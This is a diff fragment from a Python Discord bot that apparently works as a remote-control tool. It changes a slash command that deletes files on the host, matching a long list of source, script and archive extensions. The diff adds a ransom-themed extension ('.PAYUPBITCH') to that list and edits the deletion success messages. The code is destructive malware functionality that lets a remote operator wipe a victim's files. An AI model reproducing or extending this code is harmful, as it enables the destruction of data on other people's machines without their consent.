@@ -387,15 +387,17 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
                                         '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                         '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                 
-                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
+                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak', '.PAYUPBITCH',  # compressed formats
                                     )
-                                    if l.endswith(EXTENSIONSS):   
+                                    if l.endswith(EXTENSIONSS):
                                         # Delete folder . .    
                                         import os
                                         try:
                                             os.remove(l)
                                         except OSError as e:
-                                            await ctx.send("Error: %s : %s" % (l, e.strerror))  
+                                            await ctx.send("Error: %s : %s" % (l, e.strerror)) 
+                                        finally:
+                                            await ctx.send("Successfully deleted Folder Contents!") 
                                     else:
                                         pass
                 else:
@@ -403,9 +405,10 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
                     import os
                     try:
                         os.remove(file_input)
-                        await ctx.send("Deleted single file")
+                        await ctx.send("Successfully deleted File!")
                     except OSError as e:
-                        await ctx.send("Error: %s : %s" % (file_input, e.strerror))              
+                        await ctx.send("Error: %s : %s" % (file_input, e.strerror))
+
                 await ctx.send(f"Deleted user DIR / folder ```{file_input}``` ```{filenames}```")
             else:                             
                 await ctx.send(f"**Please enter a DIR!**")
@@ -437,4 +440,6 @@ async def SendMessageBox_command(ctx: SlashContext):
             await ctx.send(content="Cancelled sending!", hidden=True)
 
         
+
+
 client.run(token)
